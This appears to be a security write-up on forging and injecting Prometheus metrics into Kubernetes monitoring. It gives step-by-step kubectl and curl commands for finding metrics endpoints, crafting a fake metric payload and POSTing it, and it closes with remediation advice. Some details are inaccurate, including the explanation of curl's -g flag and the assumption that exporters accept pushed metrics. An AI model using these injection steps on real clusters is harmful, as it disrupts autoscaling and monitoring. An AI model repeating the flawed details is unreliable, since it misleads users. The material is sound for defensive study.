# Kubernetes Metrics Collection Interference Vulnerability

## 1. Overview

### Attack Vector Description

An attacker can interfere with the Kubernetes metrics collection process, leading to inaccurate or incomplete monitoring data. This can be achieved by flooding metrics endpoints with spurious data, corrupting existing metrics, or even disabling metric collection agents entirely. By manipulating the data used for autoscaling, resource allocation, and alerting, the attacker can disrupt the cluster's operation and potentially gain unauthorized access or control.

### Potential Impact and Consequences

*   **Denial of Service (DoS):** Inaccurate metrics can lead to resource misallocation, starving legitimate services while over-allocating resources to idle ones.
*   **Privilege Escalation:** Incorrect scaling decisions based on manipulated metrics might inadvertently expose privileged containers or nodes.
*   **Data Corruption:** The attacker could overwrite or corrupt critical performance metrics, hindering troubleshooting and performance analysis.
*   **Information Disclosure:**  While not direct, manipulated metrics could obfuscate actual issues, allowing unauthorized activities to go unnoticed.
*   **Autoscaling Manipulation:** Disrupting autoscaling based on metrics can lead to inefficient resource utilization, performance degradation, or even service outages.

### Risk Level Assessment

**High**

While not directly resulting in code execution or privilege escalation, manipulating the metrics can indirectly lead to significant operational disruptions, performance degradation, and potentially pave the way for other attacks. The reliance on metrics for critical cluster functions elevates the risk.

### Technical Explanation of Why This Vulnerability Exists

The vulnerability stems from a lack of proper input validation and authorization controls on metric collection endpoints and agents. If these endpoints are exposed (intentionally or unintentionally) without proper authentication or rate limiting, an attacker can flood them with malicious or forged metrics.  Furthermore, weak security configurations on metric collection agents themselves (e.g., Prometheus exporters, Heapster) can allow an attacker to disable or reconfigure them to prevent accurate data collection. The fundamental problem is the trust placed in the data ingested without adequate verification.

### Prerequisites and Conditions Needed

*   **Access to Kubernetes Cluster:** The attacker needs some level of access to the Kubernetes cluster, even if it's just network access to the metric collection endpoints.
*   **Identification of Metrics Endpoints:**  The attacker must identify the endpoints used for metrics collection, such as Prometheus endpoints, Heapster APIs, or custom exporter endpoints. This can be done through network scanning, configuration analysis, or information leakage.
*   **Ability to Forge Metrics Data:** The attacker needs to be able to craft HTTP requests with appropriately formatted metrics data. This often requires understanding the specific format expected by the metrics collection system (e.g., Prometheus exposition format).
*   **Understanding of Kubernetes Autoscaling (Optional):** While not strictly required, understanding how autoscaling is configured and operates makes exploiting this vulnerability more impactful and targeted.

## 2. Validation and Exploitation Steps

### Phase 1: Validation - Identify and Test Metrics Endpoints

1.  **Identify Services Exposing Metrics:**

    ```bash
    kubectl get svc -A | grep metrics
    ```

    *   **Explanation:** This command lists all services in the cluster across all namespaces and filters for those with "metrics" in their names. This is a common naming convention for services that expose metrics.
    *   **Why:** This helps identify potential targets for metrics interference.
    *   **Expected Output:** A list of services, possibly including `kube-state-metrics`, `prometheus`, or custom exporter services.
    *   **Look For:** Any service that seems to expose metrics data. Note the service name and namespace.

2.  **Determine the Metrics Endpoint:**

    ```bash
    kubectl describe svc -n <namespace> <service_name> | grep Endpoints:
    ```

    *   **Explanation:** This command describes the specific service identified in the previous step and filters for the "Endpoints" field.
    *   **Why:** This provides the IP address and port of the pods that are exposing the metrics.
    *   **Expected Output:** A line containing the IP address and port of the endpoints.  For example: `Endpoints:         10.42.0.100:8080,10.42.0.101:8080`
    *   **Look For:** The IP addresses and ports that are listed after "Endpoints:".

3.  **Access the Metrics Endpoint and Inspect the Data:**

    ```bash
    curl -k http://<endpoint_ip>:<endpoint_port>/metrics
    ```

    *   **Explanation:** This command attempts to access the `/metrics` endpoint on one of the identified endpoints using `curl`. The `-k` flag ignores certificate validation, which is often necessary in internal Kubernetes networks.
    *   **Why:** This verifies that the endpoint is accessible and reveals the format of the metrics data.
    *   **Expected Output:** A large block of text containing metrics data in a specific format (usually Prometheus exposition format).  If the endpoint returns a 401, 403 or other error code, then authentication and authorization may be required, making exploitation more challenging. If it fails to connect, the endpoint might not be exposed externally or might be blocked by network policies.
    *   **Look For:** The structure of the metrics data, the names of the metrics, and any labels used.

4. **(Optional) Check for Authentication/Authorization:**

   If the previous `curl` command fails with a 401 or 403 error, try the following to determine authentication requirements. First, try an anonymous request. Then, look for hints of authentication in service annotations or configuration:

   ```bash
   kubectl describe svc -n <namespace> <service_name> | grep annotations
   ```

   *   **Explanation:** This command searches the service's annotations for clues about authentication methods, such as API keys, OAuth configurations, or authentication proxies.
   *   **Why:** Understanding the authentication requirements is crucial for bypassing security controls and accessing the metrics endpoint.
   *   **Expected Output:** A list of annotations. Look for annotations related to authentication, authorization, or ingress configurations.
   *   **Look For:** Annotations like `nginx.ingress.kubernetes.io/auth-url`, `prometheus.io/scrape`, `kubernetes.io/ingress.class`, or any custom annotations related to security.

   If no authentication is required (the endpoint is publicly accessible within the cluster network), proceed to the next phase. If authentication is required, further investigation is needed to bypass or obtain valid credentials, which is beyond the scope of this specific vulnerability.

### Phase 2: Exploitation - Injecting Malicious Metrics

1.  **Craft a Malicious Metrics Payload:**

    This step requires understanding the Prometheus exposition format. Here's an example of a simple payload that injects a fabricated metric:

    ```bash
    payload='metric_injection_test{namespace="default",pod="malicious-pod"} 999999999'
    ```

    *   **Explanation:** This creates a variable `payload` containing a crafted metric. The metric name is `metric_injection_test`, it has labels for `namespace` and `pod`, and its value is a very large number.
    *   **Why:** This creates a metric that can be used to inflate statistics and potentially influence autoscaling decisions.
    *   **Note:** Adjust the metric name, labels, and value to match the target system's expectations. You can glean this from the output of step 3 in phase 1.

2.  **Inject the Payload:**

    ```bash
    curl -k -X POST -H "Content-Type: text/plain" --data "$payload" http://<endpoint_ip>:<endpoint_port>/metrics/job/injection
    ```

    *   **Explanation:** This command sends a POST request to the `/metrics/job/injection` endpoint (you might need to adjust this path based on the target).  The `-X POST` flag specifies that we are sending a POST request. The `-H "Content-Type: text/plain"` flag sets the content type to plain text, which is expected for Prometheus metrics. The `--data "$payload"` flag sends the crafted metric as the request body.
    *   **Why:** This attempts to inject the malicious metric into the metrics collection system.
    *   **Expected Output:** Ideally, the endpoint will return a 200 OK status code. However, even if it returns an error, the payload might still be ingested (especially if there's no proper validation).
    *   **Look For:**  Confirm a 200 OK status. If you receive a "405 Method Not Allowed" error, try a PUT request instead.

3. **Verify Metric Injection (using the Prometheus Query Language - PromQL):**

   Assuming you have a Prometheus instance scraping the metrics, query the metric you injected:

    ```bash
    # This command is conceptual. Replace <prometheus_ip> and <prometheus_port> with the actual values
    curl -g "http://<prometheus_ip>:<prometheus_port>/api/v1/query?query=metric_injection_test{namespace=\"default\",pod=\"malicious-pod\"}"
    ```

   *   **Explanation:** This command queries the Prometheus API for the injected metric. The `-g` flag allows special characters like "=" to be used in the query string.
   *   **Why:** To verify the metric was successfully injected and is being collected by Prometheus.
   *   **Expected Output:** JSON output containing the metric's value and labels if the injection was successful. For example:
       ```json
       {
           "status": "success",
           "data": {
               "resultType": "vector",
               "result": [
                   {
                       "metric": {
                           "__name__": "metric_injection_test",
                           "job": "injection",
                           "namespace": "default",
                           "pod": "malicious-pod"
                       },
                       "value": [
                           1678886400,
                           "999999999"
                       ]
                   }
               ]
           }
       }
       ```
   *   **Look For:** The presence of your injected metric and its associated value.

### Phase 3: Monitor Impact (Optional but Recommended)

1.  **Observe Autoscaling Behavior:**

    If the cluster uses autoscaling based on metrics, observe how the injected metric affects scaling decisions. Monitor the number of replicas for the affected services.

2.  **Analyze Performance Degradation:**

    If the injected metric is used to allocate resources, monitor the performance of the affected services. Look for signs of resource starvation or over-allocation.

### Remediation Recommendations

*   **Implement Authentication and Authorization:** Require authentication and authorization for all metrics endpoints. Use strong authentication mechanisms such as API keys, OAuth 2.0, or mTLS.
*   **Enforce Rate Limiting:** Implement rate limiting on metrics endpoints to prevent attackers from flooding the system with malicious data.
*   **Validate Input:** Validate all incoming metrics data to ensure that it conforms to expected formats and values. Reject any invalid or suspicious data.
*   **Secure Metric Collection Agents:** Ensure that metric collection agents are properly secured and configured to prevent unauthorized access or modification. Use strong passwords, enable encryption, and restrict access to sensitive data.
*   **Monitor Metric Integrity:** Implement monitoring to detect anomalies and inconsistencies in metrics data. Alert administrators to any suspicious activity.
*   **Network Policies:** Implement network policies to restrict access to metrics endpoints to only authorized sources.
*   **Least Privilege Principle:** Grant only the necessary permissions to metric collection agents and users.
*   **Regular Security Audits:** Conduct regular security audits to identify and address vulnerabilities in the metrics collection system.
